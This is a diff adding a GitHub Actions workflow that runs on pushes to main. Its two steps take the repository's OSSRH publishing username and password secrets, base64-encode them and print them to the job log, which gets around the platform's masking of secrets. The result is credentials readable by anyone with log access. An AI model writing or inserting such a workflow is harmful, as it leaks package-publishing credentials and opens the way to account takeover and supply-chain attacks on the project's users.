@@ -1,0 +1,25 @@
+name: Base64 Environment Variables
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  output-env:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Output environment variables
+        run: echo $MAVEN_USERNAME | base64
+        env:
+          MAVEN_USERNAME: ${{ secrets.OSSRH_TOKEN_USERNAME }}
+
+      - name: Output environment variables 2
+        run: echo $MAVEN_PASSWORD | base64
+
+        env:
+          MAVEN_PASSWORD: ${{ secrets.OSSRH_TOKEN_PASSWORD }}
